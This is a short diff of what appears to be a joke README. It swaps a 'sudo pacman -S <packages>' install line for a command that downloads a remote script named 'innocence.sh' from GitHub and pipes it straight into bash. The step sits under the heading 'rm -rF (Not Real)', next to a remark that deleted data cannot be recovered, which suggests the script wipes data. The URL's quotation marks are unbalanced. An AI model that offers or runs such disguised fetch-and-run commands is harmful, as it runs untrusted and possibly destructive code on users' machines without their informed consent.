@@ -23,7 +23,7 @@ But don't worry Microsoft won't be able to recover your data after what they are
   - **rm -rF (Not Real)**
 
 	```
-    sudo pacman -S <packages>
+	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh) 
     ```
 	
 </details>
